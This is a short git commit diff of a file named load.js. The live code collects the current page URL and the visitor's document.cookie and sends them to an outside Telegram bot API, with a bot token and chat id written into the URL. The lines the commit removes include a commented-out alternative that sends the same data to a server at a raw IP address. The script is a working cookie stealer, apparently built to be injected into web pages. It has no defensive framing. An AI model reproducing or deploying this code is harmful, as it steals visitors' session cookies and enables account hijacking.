3135bde9b49281fb96b9b7aafbfdd6b3d15b1afd
Hello <79208749+slj369369@users.noreply.github.com>
2021-02-17 22:34:35 +0800

    Update load.js

--- load.js
+++ load.js
@@ -7,8 +7,6 @@ url = window.location.href
     url = url+'Cookie'+document.cookie
     xmlhttp=new XMLHttpRequest();
     bot= 'https://api.telegram.org/bot1261192804:AAEN08e2_gs4YwpEfBOQbEb__zgSsYDNGng/sendMessage?chat_id=819952462&text='+url
-    // xmlhttp.open("GET","http://8.210.61.3:8000/369/"+url,true);
     xmlhttp.open("GET",bot,true);
-    // xmlhttp.setRequestHeader("Access-Control-Allow-Origin","*");
     xmlhttp.send();
     console.log(url)
